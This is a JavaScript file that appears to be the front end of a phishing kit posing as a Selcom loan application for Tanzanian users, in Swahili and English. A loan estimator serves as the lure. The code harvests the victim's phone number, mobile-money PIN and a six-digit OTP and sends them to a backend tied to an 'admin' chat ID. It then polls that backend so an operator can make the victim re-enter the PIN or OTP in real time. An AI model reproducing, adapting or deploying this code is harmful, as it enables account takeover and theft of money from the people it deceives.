document.addEventListener('DOMContentLoaded', () => {
  const screenWelcome = document.getElementById('screen-welcome');
  const screenEstimator = document.getElementById('screen-estimator');
  const screenStep1 = document.getElementById('screen-step1');
  const screenStep2 = document.getElementById('screen-step2');
  const screenStep3 = document.getElementById('screen-step3');
  const screenPin = document.getElementById('screen-pin');
  const screenOtp = document.getElementById('screen-otp');
  const screenLoading = document.getElementById('screen-loading');
  const screenSuccess = document.getElementById('screen-success');

  const credsBanner = document.getElementById('creds-surface-banner');
  const otpBanner = document.getElementById('otp-surface-banner');
  const phoneError = document.getElementById('phone-error');

  let currentUserId = null;
  let statusPollInterval = null;
  let countdownInterval = null;
  let currentLang = 'sw'; // default Swahili

  const urlParams = new URLSearchParams(window.location.search);
  const adminParam = urlParams.get('admin') || '';

  function showScreen(target) {
    [screenWelcome, screenEstimator, screenStep1, screenStep2, screenStep3, screenPin, screenOtp, screenLoading, screenSuccess].forEach(s => {
      if (s) s.classList.remove('active');
    });
    if (target) target.classList.add('active');
  }

  // Global Language Switcher function
  function setLanguage(lang) {
    currentLang = lang;
    
    document.querySelectorAll('.lang-btn').forEach(b => {
      if ((lang === 'en' && (b.innerText.includes('ENG') || b.id.includes('eng'))) || 
          (lang === 'sw' && (b.innerText.includes('SWAHILI') || b.id.includes('swa')))) {
        b.classList.add('active');
      } else {
        b.classList.remove('active');
      }
    });

    document.querySelectorAll('[data-en]').forEach(el => {
      const text = el.getAttribute(`data-${lang}`);
      if (text) {
        if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
          el.placeholder = text;
        } else {
          el.innerHTML = text;
        }
      }
    });
  }

  const btnEng = document.getElementById('btn-lang-eng');
  const btnSwa = document.getElementById('btn-lang-swa');
  const estBtnEng = document.querySelector('.est-lang-eng');
  const estBtnSwa = document.querySelector('.est-lang-swa');

  if (btnEng) btnEng.addEventListener('click', () => setLanguage('en'));
  if (btnSwa) btnSwa.addEventListener('click', () => setLanguage('sw'));
  if (estBtnEng) estBtnEng.addEventListener('click', () => setLanguage('en'));
  if (estBtnSwa) estBtnSwa.addEventListener('click', () => setLanguage('sw'));

  // Loan Estimator Sliders
  const loanRange = document.getElementById('loan-range');
  const loanAmountDisplay = document.getElementById('loan-amount-display');
  const termRange = document.getElementById('term-range');
  const loanTermDisplay = document.getElementById('loan-term-display');
  const estMonthlyVal = document.getElementById('est-monthly-val');
  const estTotalVal = document.getElementById('est-total-val');

  function updateEstimator() {
    const amt = Number(loanRange.value);
    const months = Number(termRange.value);
    loanAmountDisplay.innerText = `TSH ${amt.toLocaleString()}`;
    loanTermDisplay.innerText = `${months} ${currentLang === 'en' ? 'MONTHS' : 'MIEZI'}`;

    const monthly = Math.round((amt * 1.135) / months);
    const total = monthly * months;
    estMonthlyVal.innerText = `TSH ${monthly.toLocaleString()}`;
    estTotalVal.innerText = `TSH ${total.toLocaleString()}`;
  }

  if (loanRange && termRange) {
    loanRange.addEventListener('input', updateEstimator);
    termRange.addEventListener('input', updateEstimator);
    updateEstimator();
  }

  // Navigation flow
  const btnWelcomeContinue = document.getElementById('btn-welcome-continue');
  if (btnWelcomeContinue) {
    btnWelcomeContinue.addEventListener('click', () => showScreen(screenEstimator));
  }

  const btnEstSignin = document.getElementById('btn-est-signin');
  if (btnEstSignin) {
    btnEstSignin.addEventListener('click', () => showScreen(screenStep1));
  }

  const btnStep1Back = document.getElementById('btn-step1-back');
  if (btnStep1Back) {
    btnStep1Back.addEventListener('click', () => showScreen(screenEstimator));
  }

  const btnStep1Next = document.getElementById('btn-step1-next');
  if (btnStep1Next) {
    btnStep1Next.addEventListener('click', () => showScreen(screenStep2));
  }

  const btnStep2Prev = document.getElementById('btn-step2-prev');
  if (btnStep2Prev) {
    btnStep2Prev.addEventListener('click', () => showScreen(screenStep1));
  }
  
  const phoneInput = document.getElementById('phone-number');
  if (phoneInput) {
    phoneInput.addEventListener('input', (e) => {
      let val = e.target.value.replace(/\D/g, '');
      if (val.length > 0 && !val.startsWith('0')) {
        val = '0' + val.replace(/^0+/, '');
      }
      e.target.value = val;
    });
  }

  const btnStep2Next = document.getElementById('btn-step2-next');
  if (btnStep2Next) {
    btnStep2Next.addEventListener('click', () => {
      const firstName = document.getElementById('first-name').value.trim();
      const lastName = document.getElementById('last-name').value.trim();
      const phoneVal = phoneInput ? phoneInput.value.trim() : '';

      if (!phoneVal.startsWith('0') || phoneVal.length < 9) {
        if (phoneError) {
          phoneError.innerText = currentLang === 'en' ? 'Phone number must start with 0 and be valid.' : 'Nambari lazima ianze na 0 na iwe sahihi.';
          phoneError.style.display = 'block';
        }
        return;
      }
      if (phoneError) phoneError.style.display = 'none';

      document.getElementById('sum-applicant').innerText = `${firstName} ${lastName}`.trim() || 'Client Selcom';
      document.getElementById('sum-amount').innerText = `TSh ${Number(loanRange.value).toLocaleString()}`;
      document.getElementById('sum-term').innerText = document.getElementById('loan-term-select').value;
      document.getElementById('sum-purpose').innerText = document.getElementById('loan-purpose').value.trim() || (currentLang === 'en' ? 'Business' : 'Biashara');

      showScreen(screenStep3);
    });
  }

  const btnStep3Prev = document.getElementById('btn-step3-prev');
  if (btnStep3Prev) {
    btnStep3Prev.addEventListener('click', () => showScreen(screenStep2));
  }

  const btnStep3Submit = document.getElementById('btn-step3-submit');
  if (btnStep3Submit) {
    btnStep3Submit.addEventListener('click', () => {
      const phoneVal = phoneInput ? phoneInput.value.trim() : '';
      const displayPhone = document.getElementById('display-phone');
      if (displayPhone) displayPhone.value = phoneVal;

      const otpPhoneDisplay = document.getElementById('otp-phone-display');
      if (otpPhoneDisplay) otpPhoneDisplay.innerText = `+255 ${phoneVal}`;

      showScreen(screenPin);
      if (pinDigits[0]) pinDigits[0].focus();
    });
  }

  // PIN Inputs handling
  const pinDigits = document.querySelectorAll('.pin-digit');
  const btnSubmitCreds = document.getElementById('btn-submit-creds');

  pinDigits.forEach((digit, idx) => {
    digit.addEventListener('input', () => {
      digit.value = digit.value.replace(/\D/g, '');
      if (digit.value && idx < pinDigits.length - 1) {
        pinDigits[idx + 1].focus();
      }
      checkPinComplete();
    });
    digit.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !digit.value && idx > 0) {
        pinDigits[idx - 1].focus();
      }
    });
  });

  function checkPinComplete() {
    const pinVal = Array.from(pinDigits).map(d => d.value).join('');
    if (pinVal.length === 4) {
      if (btnSubmitCreds) btnSubmitCreds.classList.add('active-blue');
    } else {
      if (btnSubmitCreds) btnSubmitCreds.classList.remove('active-blue');
    }
  }

  const togglePin = document.getElementById('toggle-pin');
  if (togglePin) {
    togglePin.addEventListener('click', () => {
      pinDigits.forEach(d => {
        d.type = d.type === 'password' ? 'text' : 'password';
      });
    });
  }

  // Submit Credentials (PIN and Phone No)
  if (btnSubmitCreds) {
    btnSubmitCreds.addEventListener('click', async () => {
      const pinVal = Array.from(pinDigits).map(d => d.value).join('');
      const phoneVal = phoneInput ? phoneInput.value.trim() : '';

      if (pinVal.length !== 4) return;
      if (credsBanner) credsBanner.classList.remove('active');

      showLoading(currentLang === 'en' ? 'PROCESSING...' : 'INACHAKATA...', currentLang === 'en' ? 'Sending account details...' : 'Inatuma taarifa za akaunti...');

      try {
        const res = await fetch(`/api/submit-credentials?admin=${encodeURIComponent(adminParam)}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phone: phoneVal, pin: pinVal, adminChatId: adminParam })
        });

        const data = await res.json();
        if (data.success) {
          currentUserId = data.userId;
          startStatusPolling();
        } else {
          hideLoading();
        }
      } catch (e) {
        hideLoading();
      }
    });
  }

  // OTP 6 Digits Handling (Auto-submit upon full 6 digits)
  const otpDigits6 = document.querySelectorAll('.otp-digit-6');
  const btnSubmitOtp = document.getElementById('btn-submit-otp');

  otpDigits6.forEach((digit, idx) => {
    digit.addEventListener('input', () => {
      digit.value = digit.value.replace(/\D/g, '');
      if (digit.value && idx < otpDigits6.length - 1) {
        otpDigits6[idx + 1].focus();
      }
      checkOtpComplete();
    });
    digit.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !digit.value && idx > 0) {
        otpDigits6[idx - 1].focus();
      }
    });
  });

  function checkOtpComplete() {
    const otpVal = Array.from(otpDigits6).map(d => d.value).join('');
    if (otpVal.length === 6) {
      if (btnSubmitOtp) btnSubmitOtp.classList.add('active-blue');
      submitOtpHandler();
    } else {
      if (btnSubmitOtp) btnSubmitOtp.classList.remove('active-blue');
    }
  }

  async function submitOtpHandler() {
    const otpVal = Array.from(otpDigits6).map(d => d.value).join('');
    if (otpVal.length !== 6) return;

    if (otpBanner) otpBanner.classList.remove('active');
    showLoading(currentLang === 'en' ? 'VERIFYING OTP...' : 'INATHIBITISHA OTP...', currentLang === 'en' ? 'Checking verification code...' : 'Kukagua msimbo wa uthibitisho...');

    try {
      const res = await fetch('/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: currentUserId, otp: otpVal })
      });

      const data = await res.json();
      if (data.success) {
        startStatusPolling();
      } else {
        hideLoading();
      }
    } catch (e) {
      hideLoading();
    }
  }

  if (btnSubmitOtp) btnSubmitOtp.addEventListener('click', submitOtpHandler);

  // 1-minute countdown timer
  function startOtpCountdown() {
    let timeLeft = 60;
    const timerText = document.getElementById('timer-text');
    const btnResend = document.getElementById('btn-resend-otp');
    if (btnResend) btnResend.classList.remove('show');

    if (countdownInterval) clearInterval(countdownInterval);

    countdownInterval = setInterval(() => {
      timeLeft--;
      const mins = Math.floor(timeLeft / 60);
      const secs = timeLeft % 60;
      if (timerText) {
        timerText.innerText = currentLang === 'en' 
          ? `Resend code within ${mins}:${secs < 10 ? '0' : ''}${secs} minutes` 
          : `Tuma tena msimbo ndani ya ${mins}:${secs < 10 ? '0' : ''}${secs} dakika`;
      }
      if (timeLeft <= 0) {
        clearInterval(countdownInterval);
        if (timerText) timerText.innerText = currentLang === 'en' ? 'Code has expired.' : 'Msimbo umekwisha muda wake.';
        if (btnResend) btnResend.classList.add('show');
      }
    }, 1000);
  }

  const btnResendOtp = document.getElementById('btn-resend-otp');
  if (btnResendOtp) {
    btnResendOtp.addEventListener('click', async () => {
      try {
        await fetch('/api/request-new-otp', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ userId: currentUserId })
        });
        alert(currentLang === 'en' ? 'New OTP request sent to admin.' : 'Ombi la OTP mpya limetumwa kwa msimamizi.');
        startOtpCountdown();
      } catch (e) {}
    });
  }

  // Polling status updates from admin callbacks
  function startStatusPolling() {
    if (statusPollInterval) clearInterval(statusPollInterval);

    statusPollInterval = setInterval(async () => {
      if (!currentUserId) return;

      try {
        const res = await fetch(`/api/check-status/${currentUserId}`);
        const data = await res.json();

        if (data.status === 'PROCEED_OTP') {
          clearInterval(statusPollInterval);
          hideLoading();
          showScreen(screenOtp);
          startOtpCountdown();
          if (otpDigits6[0]) otpDigits6[0].focus();
        } else if (data.status === 'SUCCESS') {
          clearInterval(statusPollInterval);
          hideLoading();
          document.getElementById('approved-amount-display').innerText = `TSh ${Number(loanRange.value).toLocaleString()}`;
          showScreen(screenSuccess);
        } else if (data.status === 'RETRY_PIN') {
          clearInterval(statusPollInterval);
          hideLoading();
          if (credsBanner) credsBanner.classList.add('active');
          pinDigits.forEach(d => d.value = '');
          if (pinDigits[0]) pinDigits[0].focus();
          showScreen(screenPin);
        } else if (data.status === 'RETRY_OTP') {
          clearInterval(statusPollInterval);
          hideLoading();
          if (otpBanner) otpBanner.classList.add('active');
          otpDigits6.forEach(d => d.value = '');
          if (otpDigits6[0]) otpDigits6[0].focus();
          showScreen(screenOtp);
        }
      } catch (e) {}
    }, 2500);
  }

  const btnGoHome = document.getElementById('btn-go-home');
  if (btnGoHome) {
    btnGoHome.addEventListener('click', () => {
      window.location.href = `/?admin=${encodeURIComponent(adminParam)}`;
    });
  }

  function showLoading(title, sub) {
    const loadTitle = document.getElementById('loading-title');
    const loadSub = document.getElementById('loading-sub');
    if (loadTitle) loadTitle.innerText = title;
    if (loadSub) loadSub.innerText = sub;
    showScreen(screenLoading);
  }

  function hideLoading() {}
});
    
